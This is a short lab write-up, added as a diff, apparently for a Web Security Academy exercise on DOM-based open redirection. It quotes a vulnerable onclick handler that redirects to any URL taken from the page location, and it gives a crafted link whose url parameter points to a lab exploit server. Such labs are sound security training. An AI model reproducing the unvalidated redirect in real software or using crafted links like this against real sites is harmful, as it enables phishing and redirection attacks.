@@ -1,0 +1,9 @@
+DOM-based open redirection
+
+Clicking on a random block and inspecting the page source allows us to observe the following link:
+
+<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
+
+So let's provide a /url parameter in our URL pointing to our exploit server in order to make use of it:
+
+https://ac5a1fd31e1688ab801b38d3005400cf.web-security-academy.net/post?postId=4&url=https://ac0f1f1a1e688890809238a2014b00d2.web-security-academy.net/
